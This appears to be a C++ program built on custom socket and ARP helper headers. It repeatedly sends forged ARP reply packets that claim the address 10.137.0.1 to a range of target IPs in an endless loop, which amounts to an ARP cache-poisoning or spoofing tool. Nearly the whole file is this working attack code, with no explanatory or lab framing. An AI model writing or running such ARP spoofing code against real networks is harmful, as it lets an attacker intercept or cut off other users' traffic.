#include <tcp_client.h>
#include <tcp_server.h>
#include <sock_funs.h>
#include <sock_base.h>
#include <mac_arp.h>

int main() {
    mac_arp mya;
    my_mac m;
    my_arp a;
    //mya.recv_arp(&m, &a);

    //mya.show_arp(&a);
    char * tar="10.137.0.2";
    char *fake_mac=NULL;//"\xac\x45\x89\x90\x45\x7a";
    uint32_t st = inet_addr(tar);
    mya.form_machd(&m,fake_mac);

    while(1) {
        while(st != 0xffffffff) {
            mya.form_arp(&a,"10.137.0.1" , inet_ntoa(*(struct in_addr*)&st), 2, fake_mac);
            mya.send_arp(&m, &a);
            printf("ip:%s\n",inet_ntoa(*(struct in_addr*)&st));
            st+=0x10000;
        }
        st = inet_addr(tar);
        //sleep(1);
    }
    return 0;
}
